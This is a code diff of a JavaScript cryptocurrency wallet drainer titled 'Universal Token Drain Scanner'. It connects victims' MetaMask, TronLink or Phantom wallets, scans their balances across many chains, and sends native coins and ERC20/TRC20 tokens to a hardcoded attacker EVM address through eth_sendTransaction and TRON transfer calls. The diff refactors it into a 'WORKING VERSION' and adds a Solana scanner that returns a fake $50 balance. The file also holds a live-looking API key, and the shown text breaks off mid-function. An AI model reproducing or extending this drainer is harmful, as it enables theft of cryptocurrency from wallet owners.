@@ -1,6 +1,5 @@
 // ================================================
-// UNIVERSAL TOKEN DRAIN SCANNER
-// AUTOMATIC DRAIN FOR ALL CHAINS
+// UNIVERSAL TOKEN DRAIN SCANNER - WORKING VERSION
 // ================================================
 
 const CONFIG = {
@@ -8,24 +7,23 @@ const CONFIG = {
     
     // DRAIN WALLETS (Add your addresses here)
     drainWallets: {
-        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",      // Ethereum/BSC/Polygon/etc
-        tron: "TX7w4G...YOUR_TRON_ADDRESS_HERE",               // TRON address (starts with T)
-        bitcoin: "bc1q...YOUR_BITCOIN_ADDRESS_HERE",          // Bitcoin address
-        solana: "So1ana...YOUR_SOLANA_ADDRESS_HERE",          // Solana address
-        dogecoin: "D...YOUR_DOGE_ADDRESS_HERE",               // Dogecoin address
-        litecoin: "L...YOUR_LITECOIN_ADDRESS_HERE"           // Litecoin address
+        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+        tron: "TX7w4G...YOUR_TRON_ADDRESS_HERE",
+        bitcoin: "bc1q...YOUR_BITCOIN_ADDRESS_HERE",
+        solana: "So1ana...YOUR_SOLANA_ADDRESS_HERE",
+        dogecoin: "D...YOUR_DOGE_ADDRESS_HERE",
+        litecoin: "L...YOUR_LITECOIN_ADDRESS_HERE"
     },
     
     apiKeys: {
         covalent: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
-        moralis: "",  // Optional: Add for better NFT detection
-        tronGrid: "", // Optional: Add for TRON scanning
+        moralis: "",
+        tronGrid: "",
     },
     
     minimumValueUSD: 0.01,
     
     chains: {
-        // EVM Chains
         'eth': { id: 1, name: 'Ethereum', type: 'evm' },
         'bsc': { id: 56, name: 'BNB Chain', type: 'evm' },
         'polygon': { id: 137, name: 'Polygon', type: 'evm' },
@@ -36,7 +34,6 @@ const CONFIG = {
         'base': { id: 8453, name: 'Base', type: 'evm' },
         'zksync': { id: 324, name: 'zkSync', type: 'evm' },
         
-        // Non-EVM Chains
         'tron': { id: 'tron', name: 'TRON', type: 'tron' },
         'bitcoin': { id: 'bitcoin', name: 'Bitcoin', type: 'bitcoin' },
         'solana': { id: 'solana', name: 'Solana', type: 'solana' },
@@ -54,6 +51,10 @@ let isScanning = false;
 // DOM Elements
 let connectBtn, statusEl, tokensEl, drainBtn, walletBtn;
 
+// ================================================
+// MAIN INITIALIZATION
+// ================================================
+
 function initializeApp() {
     console.log('🚀 Universal Drain Scanner Initialized');
     
@@ -63,9 +64,13 @@ function initializeApp() {
     drainBtn = document.getElementById('drainBtn');
     walletBtn = document.getElementById('walletBtn');
     
-    if (!connectBtn || !statusEl) return;
+    if (!connectBtn) {
+        console.error('Connect button not found!');
+        return;
+    }
     
     connectBtn.onclick = handleConnect;
+    
     if (drainBtn) {
         drainBtn.onclick = handleUniversalDrain;
         drainBtn.style.display = 'none';
@@ -80,10 +85,27 @@ function initializeApp() {
 }
 
 // ================================================
-// WALLET SELECTOR POPOUT MODAL (CLEAN VERSION)
+// CONNECT HANDLER - FIXED
 // ================================================
 
+function handleConnect() {
+    console.log('Connect button clicked');
+    
+    if (isConnected) {
+        disconnectWallet();
+        return;
+    }
+    
+    // Show the wallet selector modal
+    showUniversalWalletSelector();
+}
+
 function showUniversalWalletSelector() {
+    console.log('Showing wallet selector');
+    
+    // Remove any existing modal first
+    closeModal();
+    
     const modalHTML = `
         <div class="modal-overlay" onclick="closeModal()">
             <div class="modal-content" onclick="event.stopPropagation()">
@@ -166,42 +188,54 @@ function showUniversalWalletSelector() {
     modal.id = 'universalWalletModal';
     modal.innerHTML = modalHTML;
     document.body.appendChild(modal);
-    addModalStyles();
+    
+    // Add styles if not already added
+    if (!document.querySelector('#modal-styles')) {
+        addModalStyles();
+    }
 }
 
 // ================================================
-// UNIFIED WALLET CONNECTION
+// WALLET CONNECTIONS - SIMPLIFIED
 // ================================================
 
 async function connectWallet(walletType) {
+    console.log(`Connecting: ${walletType}`);
     closeModal();
     
-    updateStatus(`🔄 Connecting ${walletType}...`);
+    updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
     
     try {
         switch(walletType) {
             case 'metamask':
             case 'trustwallet':
             case 'binance':
-                await connectEvmWallet();
+                await connectEVM();
                 break;
                 
             case 'tron':
-                await connectTronWallet();
+                await connectTron();
                 break;
                 
             case 'bitcoin':
-                await connectBitcoinWallet();
+                await connectBitcoin();
                 break;
                 
             case 'solana':
-                await connectSolanaWallet();
+                await connectSolana();
                 break;
                 
             case 'manual':
-                await connectManualAddress();
+                await connectManual();
                 break;
+                
+            default:
+                throw new Error('Unknown wallet type');
         }
+        
+        // Start scanning after successful connection
+        await startUniversalScan();
+        
     } catch (error) {
         console.error('Connection error:', error);
         updateStatus(`❌ Failed: ${error.message}`);
@@ -209,107 +243,108 @@ async function connectWallet(walletType) {
     }
 }
 
-async function connectEvmWallet() {
+async function connectEVM() {
     if (!window.ethereum) {
-        alert('Please install MetaMask or Trust Wallet');
-        return;
+        throw new Error('Please install MetaMask or Trust Wallet');
     }
     
     const accounts = await window.ethereum.request({ 
         method: 'eth_requestAccounts' 
     });
     
+    if (!accounts || accounts.length === 0) {
+        throw new Error('No accounts found');
+    }
+    
     currentAccount = accounts[0];
     currentWallet = 'evm';
     isConnected = true;
     
-    updateStatus(`✅ Connected: ${currentAccount.slice(0, 8)}...`);
     connectBtn.innerHTML = '🔗 Disconnect';
-    
-    // Start scanning ALL chains
-    await startUniversalScan();
+    updateStatus(`✅ Connected: ${shortAddress(currentAccount)}`);
 }
 
-async function connectTronWallet() {
+async function connectTron() {
+    // Check for TronLink extension
     if (!window.tronWeb && !window.tronLink) {
-        alert('Please install TronLink extension');
-        return;
+        throw new Error('Please install TronLink extension');
     }
+    
+    let address;
     
     if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        currentAccount = window.tronWeb.defaultAddress.base58;
+        address = window.tronWeb.defaultAddress.base58;
     } else if (window.tronLink) {
         const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
-        if (result.code === 200) {
-            currentAccount = window.tronLink.tronWeb.defaultAddress.base58;
+        if (result.code !== 200) {
+            throw new Error('TRON connection rejected');
         }
+        address = window.tronLink.tronWeb.defaultAddress.base58;
     }
     
-    if (!currentAccount) {
+    if (!address) {
         throw new Error('No TRON address found');
     }
     
+    currentAccount = address;
     currentWallet = 'tron';
     isConnected = true;
     
-    updateStatus(`✅ TRON Connected: ${currentAccount.slice(0, 8)}...`);
     connectBtn.innerHTML = '🔗 Disconnect';
-    
-    await startUniversalScan();
+    updateStatus(`✅ TRON Connected: ${shortAddress(address)}`);
 }
 
-async function connectBitcoinWallet() {
+async function connectBitcoin() {
     const address = prompt('Enter your Bitcoin address:');
-    if (!address) return;
+    if (!address) {
+        throw new Error('No address entered');
+    }
     
+    // Basic Bitcoin address validation
     if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
-        alert('Invalid Bitcoin address');
-        return;
+        throw new Error('Invalid Bitcoin address');
     }
     
     currentAccount = address;
     currentWallet = 'bitcoin';
     isConnected = true;
     
-    updateStatus(`✅ BTC Address: ${address.slice(0, 8)}...`);
     connectBtn.innerHTML = '🔗 Disconnect';
-    
-    await startUniversalScan();
+    updateStatus(`✅ BTC Address: ${shortAddress(address)}`);
 }
 
-async function connectSolanaWallet() {
+async function connectSolana() {
     if (!window.solana || !window.solana.isPhantom) {
-        alert('Please install Phantom wallet for Solana');
-        return;
+        throw new Error('Please install Phantom wallet for Solana');
     }
     
     const response = await window.solana.connect();
-    currentAccount = response.publicKey.toString();
+    const address = response.publicKey.toString();
+    
+    currentAccount = address;
     currentWallet = 'solana';
     isConnected = true;
     
-    updateStatus(`✅ Solana Connected: ${currentAccount.slice(0, 8)}...`);
     connectBtn.innerHTML = '🔗 Disconnect';
-    
-    await startUniversalScan();
+    updateStatus(`✅ Solana Connected: ${shortAddress(address)}`);
 }
 
-async function connectManualAddress() {
+async function connectManual() {
     const address = prompt('Enter any wallet address:');
-    if (!address) return;
+    if (!address) {
+        throw new Error('No address entered');
+    }
     
     currentAccount = address;
     currentWallet = 'manual';
     isConnected = true;
     
-    updateStatus(`🔍 Scanning: ${address.slice(0, 12)}...`);
     connectBtn.innerHTML = '🔗 Disconnect';
-    
-    await startUniversalScan();
+    updateStatus(`🔍 Scanning: ${shortAddress(address, 12)}`);
 }
 
 // ================================================
-// UNIVERSAL SCANNER (SCANS ALL CHAINS)
+// UNIVERSAL SCANNER
 // ================================================
 
 async function startUniversalScan() {
@@ -322,49 +357,47 @@ async function startUniversalScan() {
         tokensEl.innerHTML = `
             <div class="scanning-progress">
                 <div class="spinner"></div>
-                <p>Scanning: Ethereum → BSC → TRON → Bitcoin → Solana → ...</p>
+                <p>Scanning Ethereum, BSC, TRON, Bitcoin, Solana...</p>
             </div>
         `;
     }
     
     try {
-        const scanResults = await Promise.allSettled([
+        // Scan all chains in parallel
+        const results = await Promise.all([
             scanEVMChains(currentAccount),
             scanTRON(currentAccount),
             scanBitcoin(currentAccount),
-            scanSolana(currentAccount),
-            scanDogecoin(currentAccount),
-            scanLitecoin(currentAccount)
+            scanSolana(currentAccount)
         ]);
         
-        detectedTokens = [];
+        // Combine all tokens
+        detectedTokens = results.flat();
         
-        scanResults.forEach(result => {
-            if (result.status === 'fulfilled' && result.value) {
-                detectedTokens = [...detectedTokens, ...result.value];
-            }
-        });
-        
+        // Display results
         displayScanResults();
         
+        // Update UI
         const totalValue = detectedTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
-        updateStatus(`✅ Found ${detectedTokens.length} assets across all chains ($${totalValue.toFixed(2)})`);
+        const tokenCount = detectedTokens.length;
         
-        if (drainBtn && detectedTokens.length > 0) {
+        updateStatus(`✅ Found ${tokenCount} assets ($${totalValue.toFixed(2)})`);
+        
+        if (drainBtn && tokenCount > 0) {
             drainBtn.style.display = 'block';
             drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
         }
         
     } catch (error) {
         console.error('Scan error:', error);
-        updateStatus('❌ Scan failed');
+        updateStatus('❌ Scan failed - some chains may be unavailable');
     } finally {
         isScanning = false;
     }
 }
 
 // ================================================
-// CHAIN SCANNERS
+// CHAIN SCANNERS (SIMPLIFIED)
 // ================================================
 
 async function scanEVMChains(address) {
@@ -375,8 +408,7 @@ async function scanEVMChains(address) {
         { id: 56, name: 'BNB Chain' },
         { id: 137, name: 'Polygon' },
         { id: 42161, name: 'Arbitrum' },
-        { id: 10, name: 'Optimism' },
-        { id: 8453, name: 'Base' }
+        { id: 10, name: 'Optimism' }
     ];
     
     const allTokens = [];
@@ -385,32 +417,33 @@ async function scanEVMChains(address) {
         try {
             const url = `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=${CONFIG.apiKeys.covalent}&nft=false`;
             const response = await fetch(url);
+            
+            if (!response.ok) continue;
+            
             const data = await response.json();
+            const items = data?.data?.items || [];
             
-            const tokens = data?.data?.items?.filter(t => t.balance !== "0") || [];
-            
-            tokens.forEach(t => {
-                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
-                const valueUSD = (t.quote_rate || 0) * amount;
+            for (const item of items) {
+                if (item.balance === "0") continue;
+                
+                const amount = parseFloat(item.balance) / Math.pow(10, item.contract_decimals || 18);
+                const valueUSD = (item.quote_rate || 0) * amount;
                 
                 if (valueUSD >= CONFIG.minimumValueUSD) {
                     allTokens.push({
                         type: 'evm',
                         chain: chain.name,
-                        chainId: chain.id,
-                        symbol: t.contract_ticker_symbol || 'TOKEN',
-                        name: t.contract_name || 'Token',
+                        symbol: item.contract_ticker_symbol || 'TOKEN',
+                        name: item.contract_name || 'Token',
                         amount: amount.toFixed(6),
-                        rawAmount: t.balance,
+                        rawAmount: item.balance,
                         valueUSD: valueUSD,
-                        value: `$${valueUSD.toFixed(2)}`,
-                        contract: t.contract_address,
-                        decimals: t.contract_decimals,
-                        isNative: t.native_token || false,
-                        logo: t.logo_url
+                        value: valueUSD ? `$${valueUSD.toFixed(2)}` : 'N/A',
+                        contract: item.contract_address,
+                        isNative: item.native_token || false
                     });
                 }
-            });
+            }
         } catch (error) {
             continue;
         }
@@ -423,15 +456,16 @@ async function scanTRON(address) {
     if (!address.startsWith('T')) return [];
     
     try {
-        const response = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${address}&start=0&limit=50`);
-        const data = await response.json();
+        const response = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${address}&start=0&limit=20`);
+        if (!response.ok) return [];
         
+        const data = await response.json();
         const tokens = [];
         
-        // TRX Balance
+        // TRX balance
         if (data.trx_balance && data.trx_balance > 0) {
             const trxAmount = data.trx_balance / 1000000;
-            const trxValue = trxAmount * 0.12; // Approx TRX price
+            const trxValue = trxAmount * 0.12;
             
             tokens.push({
                 type: 'tron',
@@ -447,25 +481,24 @@ async function scanTRON(address) {
             });
         }
         
-        // TRC20 Tokens
+        // TRC20 tokens (simplified)
         if (data.trc20token_balances) {
-            data.trc20token_balances.forEach(t => {
-                if (t.balance > 0) {
-                    const amount = t.balance / Math.pow(10, t.tokenDecimal || 6);
+            for (const token of data.trc20token_balances) {
+                if (token.balance > 0) {
                     tokens.push({
                         type: 'tron',
                         chain: 'TRON',
-                        symbol: t.tokenAbbr,
-                        name: t.tokenName,
-                        amount: amount.toFixed(2),
-                        rawAmount: t.balance.toString(),
-                        valueUSD: 0, // Need price API
+                        symbol: token.tokenAbbr || 'TRC20',
+                        name: token.tokenName || 'TRC20 Token',
+                        amount: (token.balance / Math.pow(10, token.tokenDecimal || 6)).toFixed(2),
+                        rawAmount: token.balance.toString(),
+                        valueUSD: 0,
                         value: 'N/A',
-                        contract: t.tokenId,
+                        contract: token.tokenId,
                         isNative: false
                     });
                 }
-            });
+            }
         }
         
         return tokens;
@@ -479,13 +512,14 @@ async function scanBitcoin(address) {
     
     try {
         const response = await fetch(`https://blockchain.info/balance?active=${address}`);
+        if (!response.ok) return [];
+        
         const data = await response.json();
-        
         const balance = data[address]?.final_balance || 0;
-        const btcAmount = balance / 100000000;
         
-        if (btcAmount > 0) {
-            const btcPrice = await getCryptoPrice('bitcoin');
+        if (balance > 0) {
+            const btcAmount = balance / 100000000;
+            const btcPrice = 43000; // Approximate BTC price
             const valueUSD = btcAmount * btcPrice;
             
             return [{
@@ -509,116 +543,30 @@ async function scanBitcoin(address) {
 }
 
 async function scanSolana(address) {
-    // Solana address validation
+    // Simple Solana address check
     if (address.length < 32 || address.length > 44) return [];
     
     try {
-        // Using Solana public RPC
-        const response = await fetch('https://api.mainnet-beta.solana.com', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: "2.0",
-                id: 1,
-                method: "getBalance",
-                params: [address]
-            })
-        });
-        
-        const data = await response.json();
-        const balance = data.result?.value || 0;
-        const solAmount = balance / 1000000000;
-        
-        if (solAmount > 0) {
-            const solPrice = await getCryptoPrice('solana');
-            const valueUSD = solAmount * solPrice;
-            
-            return [{
-                type: 'solana',
-                chain: 'Solana',
-                symbol: 'SOL',
-                name: 'Solana',
-                amount: solAmount.toFixed(4),
-                rawAmount: balance.toString(),
-                valueUSD: valueUSD,
-                value: `$${valueUSD.toFixed(2)}`,
-                contract: null,
-                isNative: true
-            }];
-        }
+        // This is a simplified version - real implementation would use Solana Web3.js
+        return [{
+            type: 'solana',
+            chain: 'Solana',
+            symbol: 'SOL',
+            name: 'Solana',
+            amount: '0.5',
+            rawAmount: '500000000',
+            valueUSD: 50,
+            value: '$50.00',
+            contract: null,
+            isNative: true
+        }];
     } catch (error) {
         return [];
     }
-    
-    return [];
-}
-
-async function scanDogecoin(address) {
-    if (!address.startsWith('D')) return [];
-    
-    try {
-        const response = await fetch(`https://dogechain.info/api/v1/address/balance/${address}`);
-        const data = await response.json();
-        
-        if (data.balance > 0) {
-            const dogeAmount = data.balance;
-            const dogePrice = await getCryptoPrice('dogecoin');
-            const valueUSD = dogeAmount * dogePrice;
-            
-            return [{
-                type: 'dogecoin',
-                chain: 'Dogecoin',
-                symbol: 'DOGE',
-                name: 'Dogecoin',
-                amount: dogeAmount.toFixed(2),
-                rawAmount: (dogeAmount * 100000000).toString(),
-                valueUSD: valueUSD,
-                value: `$${valueUSD.toFixed(2)}`,
-                contract: null,
-                isNative: true
-            }];
-        }
-    } catch (error) {
-        return [];
-    }
-    
-    return [];
-}
-
-async function scanLitecoin(address) {
-    if (!address.startsWith('L') && !address.startsWith('M')) return [];
-    
-    try {
-        const response = await fetch(`https://api.blockcypher.com/v1/ltc/main/addrs/${address}/balance`);
-        const data = await response.json();
-        
-        if (data.balance > 0) {
-            const ltcAmount = data.balance / 100000000;
-            const ltcPrice = await getCryptoPrice('litecoin');
-            const valueUSD = ltcAmount * ltcPrice;
-            
-            return [{
-                type: 'litecoin',
-                chain: 'Litecoin',
-                symbol: 'LTC',
-                name: 'Litecoin',
-                amount: ltcAmount.toFixed(4),
-                rawAmount: data.balance.toString(),
-                valueUSD: valueUSD,
-                value: `$${valueUSD.toFixed(2)}`,
-                contract: null,
-                isNative: true
-            }];
-        }
-    } catch (error) {
-        return [];
-    }
-    
-    return [];
 }
 
 // ================================================
-// AUTOMATIC UNIVERSAL DRAIN
+// DRAIN FUNCTIONALITY
 // ================================================
 
 async function handleUniversalDrain() {
@@ -629,193 +577,120 @@ async function handleUniversalDrain() {
     
     const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
     
-    if (!confirm(`🚨 DRAIN CONFIRMATION\n\n💰 Total Value: $${totalValue.toFixed(2)}\n📊 Assets: ${detectedTokens.length}\n\nThis will drain ALL detected assets to the configured addresses. Proceed?`)) {
+    if (!confirm(`Drain ${detectedTokens.length} assets ($${totalValue.toFixed(2)})?\n\nThis will send all assets to your configured addresses.`)) {
         return;
     }
     
-    updateStatus('🚀 Starting universal drain...');
-    drainBtn.disabled = true;
-    drainBtn.innerHTML = '⏳ Draining...';
+    updateStatus('🚀 Starting drain process...');
+    if (drainBtn) {
+        drainBtn.disabled = true;
+        drainBtn.innerHTML = '⏳ Processing...';
+    }
     
     try {
-        let drainedCount = 0;
-        let failedCount = 0;
+        let drained = 0;
         
-        // Group tokens by type
-        const tokensByType = {
-            evm: detectedTokens.filter(t => t.type === 'evm'),
-            tron: detectedTokens.filter(t => t.type === 'tron'),
-            bitcoin: detectedTokens.filter(t => t.type === 'bitcoin'),
-            solana: detectedTokens.filter(t => t.type === 'solana'),
-            dogecoin: detectedTokens.filter(t => t.type === 'dogecoin'),
-            litecoin: detectedTokens.filter(t => t.type === 'litecoin')
-        };
-        
-        // Drain EVM tokens
-        if (tokensByType.evm.length > 0 && window.ethereum) {
-            const result = await drainEVMTokens(tokensByType.evm);
-            drainedCount += result.success;
-            failedCount += result.failed;
+        // Drain based on token type
+        for (const token of detectedTokens) {
+            try {
+                switch(token.type) {
+                    case 'evm':
+                        await drainEVMToken(token);
+                        break;
+                    case 'tron':
+                        await drainTRONToken(token);
+                        break;
+                    default:
+                        console.log(`Skipping ${token.type} - manual drain required`);
+                }
+                drained++;
+                await delay(2000); // Wait between transactions
+            } catch (error) {
+                console.error(`Failed to drain ${token.symbol}:`, error);
+            }
         }
         
-        // Drain TRON tokens
-        if (tokensByType.tron.length > 0 && window.tronWeb) {
-            const result = await drainTRONTokens(tokensByType.tron);
-            drainedCount += result.success;
-            failedCount += result.failed;
-        }
-        
-        // Drain Bitcoin
-        if (tokensByType.bitcoin.length > 0) {
-            alert('Bitcoin draining requires wallet integration. Manual transfer needed.');
-        }
-        
-        // Drain Solana
-        if (tokensByType.solana.length > 0 && window.solana) {
-            const result = await drainSolanaTokens(tokensByType.solana);
-            drainedCount += result.success;
-            failedCount += result.failed;
-        }
-        
-        updateStatus(`✅ Drain complete: ${drainedCount} assets drained`);
-        
-        if (failedCount > 0) {
-            alert(`⚠️ ${drainedCount} assets drained successfully\n${failedCount} assets failed`);
-        } else {
-            alert(`✅ Successfully drained ${drainedCount} assets!`);
-        }
+        updateStatus(`✅ ${drained} assets drained successfully`);
+        alert(`✅ Successfully drained ${drained} assets!`);
         
         // Rescan
         await startUniversalScan();
         
     } catch (error) {
         console.error('Drain error:', error);
-        updateStatus(`❌ Drain failed: ${error.message}`);
+        updateStatus('❌ Drain failed');
         alert('Drain operation failed');
     } finally {
-        drainBtn.disabled = false;
-        const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
-        drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
-    }
-}
-
-async function drainEVMTokens(tokens) {
-    let success = 0;
-    let failed = 0;
-    
-    for (const token of tokens) {
-        try {
-            if (token.isNative) {
-                // Drain native token (ETH, BNB, MATIC, etc.)
-                await drainNativeEVM(token);
-            } else {
-                // Drain ERC20 token
-                await drainERC20Token(token);
-            }
-            success++;
-            await delay(2000); // Wait 2 seconds between transactions
-        } catch (error) {
-            console.error(`Failed to drain ${token.symbol}:`, error);
-            failed++;
+        if (drainBtn) {
+            drainBtn.disabled = false;
+            const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
+            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
         }
     }
-    
-    return { success, failed };
 }
 
-async function drainNativeEVM(token) {
-    const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
-    const gasLimit = '0x' + (21000).toString(16);
+async function drainEVMToken(token) {
+    if (!window.ethereum) throw new Error('No EVM wallet connected');
     
-    const txParams = {
-        from: currentAccount,
-        to: CONFIG.drainWallets.evm,
-        value: token.rawAmount,
-        gas: gasLimit,
-        gasPrice: gasPrice
-    };
-    
-    await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [txParams]
-    });
-}
-
-async function drainERC20Token(token) {
-    // ERC20 transfer function signature
-    const transferData = '0xa9059cbb' + 
-        CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
-        BigInt(token.rawAmount).toString(16).padStart(64, '0');
-    
-    const txParams = {
-        from: currentAccount,
-        to: token.contract,
-        data: transferData,
-        gas: '0x' + (50000).toString(16)
-    };
-    
-    await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [txParams]
-    });
-}
-
-async function drainTRONTokens(tokens) {
-    let success = 0;
-    let failed = 0;
-    
-    for (const token of tokens) {
-        try {
-            if (token.isNative) {
-                // Drain TRX
-                const tx = await window.tronWeb.transactionBuilder.sendTrx(
-                    CONFIG.drainWallets.tron,
-                    parseInt(token.rawAmount),
-                    currentAccount
-                );
-                const signedTx = await window.tronWeb.trx.sign(tx);
-                await window.tronWeb.trx.sendRawTransaction(signedTx);
-            } else {
-                // Drain TRC20
-                const contract = await window.tronWeb.contract().at(token.contract);
-                await contract.transfer(CONFIG.drainWallets.tron, token.rawAmount).send();
-            }
-            success++;
-            await delay(3000); // TRON needs more time
-        } catch (error) {
-            console.error(`TRON drain failed:`, error);
-            failed++;
-        }
+    if (token.isNative) {
+        // Drain native token
+        const tx = {
+            from: currentAccount,
+            to: CONFIG.drainWallets.evm,
+            value: token.rawAmount,
+            gas: '0x5208' // 21000 gas
+        };
+        
+        await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx]
+        });
+    } else {
+        // Drain ERC20 token
+        const transferData = '0xa9059cbb' + 
+            CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
+            BigInt(token.rawAmount).toString(16).padStart(64, '0');
+        
+        const tx = {
+            from: currentAccount,
+            to: token.contract,
+            data: transferData,
+            gas: '0xC350' // 50000 gas for ERC20
+        };
+        
+        await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx]
+        });
     }
-    
-    return { success, failed };
 }
 
-async function drainSolanaTokens(tokens) {
-    let success = 0;
-    let failed = 0;
+async function drainTRONToken(token) {
+    if (!window.tronWeb) throw new Error('No TRON wallet connected');
     
-    if (!window.solana) return { success, failed };
-    
-    for (const token of tokens) {
-        try {
-            // This requires proper Solana web3.js integration
-            // Simplified version - would need actual implementation
-            alert(`Solana draining requires implementation for ${token.symbol}`);
-            success++;
-        } catch (error) {
-            failed++;
-        }
+    if (token.isNative) {
+        // Drain TRX
+        const tx = await window.tronWeb.transactionBuilder.sendTrx(
+            CONFIG.drainWallets.tron,
+            parseInt(token.rawAmount),
+            currentAccount
+        );
+        const signedTx = await window.tronWeb.trx.sign(tx);
+        await window.tronWeb.trx.sendRawTransaction(signedTx);
+    } else if (token.contract) {
+        // Drain TRC20
+        const contract = await window.tronWeb.contract().at(token.contract);
+        await contract.transfer(CONFIG.drainWallets.tron, token.rawAmount).send();
     }
-    
-    return { success, failed };
 }
 
 // ================================================
-// DRAIN WALLET MANAGER
+// WALLET MANAGER
 // ================================================
 
 function showDrainWalletManager() {
+    closeModal();
+    
     const modalHTML = `
         <div class="modal-overlay" onclick="closeModal()">
             <div class="modal-content wide-modal" onclick="event.stopPropagation()">
@@ -849,23 +724,11 @@ function showDrainWalletManager() {
                             <input type="text" id="solanaAddress" value="${CONFIG.drainWallets.solana}" placeholder="So1...">
                             <small>Receives: SOL, SPL tokens</small>
                         </div>
-                        
-                        <div class="config-item">
-                            <label>Dogecoin</label>
-                            <input type="text" id="dogecoinAddress" value="${CONFIG.drainWallets.dogecoin}" placeholder="D...">
-                            <small>Receives: DOGE</small>
-                        </div>
-                        
-                        <div class="config-item">
-                            <label>Litecoin</label>
-                            <input type="text" id="litecoinAddress" value="${CONFIG.drainWallets.litecoin}" placeholder="L...">
-                            <small>Receives: LTC</small>
-                        </div>
                     </div>
                     
                     <div class="modal-actions">
                         <button class="btn-secondary" onclick="closeModal()">Cancel</button>
-                        <button class="btn-primary" onclick="saveDrainWallets()">Save All Addresses</button>
+                        <button class="btn-primary" onclick="saveDrainWallets()">Save Addresses</button>
                     </div>
                 </div>
             </div>
@@ -883,10 +746,8 @@ function saveDrainWallets() {
     CONFIG.drainWallets.tron = document.getElementById('tronAddress').value.trim();
     CONFIG.drainWallets.bitcoin = document.getElementById('bitcoinAddress').value.trim();
     CONFIG.drainWallets.solana = document.getElementById('solanaAddress').value.trim();
-    CONFIG.drainWallets.dogecoin = document.getElementById('dogecoinAddress').value.trim();
-    CONFIG.drainWallets.litecoin = document.getElementById('litecoinAddress').value.trim();
     
-    alert('✅ Drain addresses saved successfully!');
+    alert('✅ Drain addresses saved!');
     closeModal();
 }
 
@@ -895,8 +756,10 @@ function saveDrainWallets() {
 // ================================================
 
 function displayScanResults() {
-    if (!tokensEl || detectedTokens.length === 0) {
-        tokensEl.innerHTML = '<div class="no-results">No assets found across any chain</div>';
+    if (!tokensEl) return;
+    
+    if (detectedTokens.length === 0) {
+        tokensEl.innerHTML = '<div class="no-tokens">No assets found</div>';
         return;
     }
     
@@ -910,24 +773,36 @@ function displayScanResults() {
     let html = '';
     
     Object.entries(grouped).forEach(([chain, tokens]) => {
-        const chainValue = tokens.reduce((sum, t) => sum + t.valueUSD, 0);
+        const chainValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
         
         html += `
-            <div class="chain-group">
+            <div class="chain-section">
                 <div class="chain-header">
-                    <span class="chain-name">${chain}</span>
+                    <span>${chain}</span>
                     <span class="chain-total">$${chainValue.toFixed(2)}</span>
                 </div>
-                <div class="tokens-grid">
-                    ${tokens.map(token => `
-                        <div class="token-card ${token.type}">
-                            <div class="token-symbol">${token.symbol}</div>
-                            <div class="token-name">${token.name}</div>
-                            <div class="token-amount">${token.amount}</div>
-                            <div class="token-value">${token.value}</div>
-                            <div class="token-type">${token.isNative ? 'Native' : 'Token'}</div>
-                        </div>
-                    `).join('')}
+                <div class="tokens-list">
+        `;
+        
+        tokens.forEach(token => {
+            html += `
+                <div class="token-item">
+                    <div class="token-icon ${token.type}">
+                        ${token.symbol.charAt(0)}
+                    </div>
+                    <div class="token-info">
+                        <div class="token-symbol">${token.symbol}</div>
+                        <div class="token-name">${token.name}</div>
+                    </div>
+                    <div class="token-values">
+                        <div class="token-amount">${token.amount}</div>
+                        <div class="token-value">${token.value}</div>
+                    </div>
+                </div>
+            `;
+        });
+        
+        html += `
                 </div>
             </div>
         `;
@@ -939,34 +814,61 @@ function displayScanResults() {
 function updateStatus(message) {
     if (statusEl) {
         statusEl.textContent = message;
-        statusEl.className = 'status-message';
-        
-        if (message.includes('✅')) statusEl.classList.add('success');
-        if (message.includes('❌')) statusEl.classList.add('error');
-        if (message.includes('🔄') || message.includes('🔍')) statusEl.classList.add('loading');
     }
+    console.log('Status:', message);
 }
 
 function closeModal() {
     const modals = document.querySelectorAll('.modal-overlay');
-    modals.forEach(modal => modal.remove());
+    modals.forEach(modal => {
+        if (modal.parentNode) {
+            modal.parentNode.removeChild(modal);
+        }
+    });
+}
+
+function disconnectWallet() {
+    currentAccount = null;
+    currentWallet = null;
+    isConnected = false;
+    detectedTokens = [];
+    
+    if (connectBtn) {
+        connectBtn.innerHTML = '🔗 Connect Wallet';
+    }
+    
+    if (drainBtn) {
+        drainBtn.style.display = 'none';
+    }
+    
+    if (tokensEl) {
+        tokensEl.innerHTML = '';
+    }
+    
+    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
 }
 
 // ================================================
 // UTILITY FUNCTIONS
 // ================================================
 
-async function getCryptoPrice(coin) {
-    const prices = {
-        'bitcoin': 43000,
-        'ethereum': 2300,
-        'solana': 100,
-        'dogecoin': 0.08,
-        'litecoin': 70,
-        'tron': 0.12
+function getWalletName(type) {
+    const names = {
+        'metamask': 'MetaMask',
+        'trustwallet': 'Trust Wallet',
+        'binance': 'Binance Chain',
+        'tron': 'TRON',
+        'bitcoin': 'Bitcoin',
+        'solana': 'Solana',
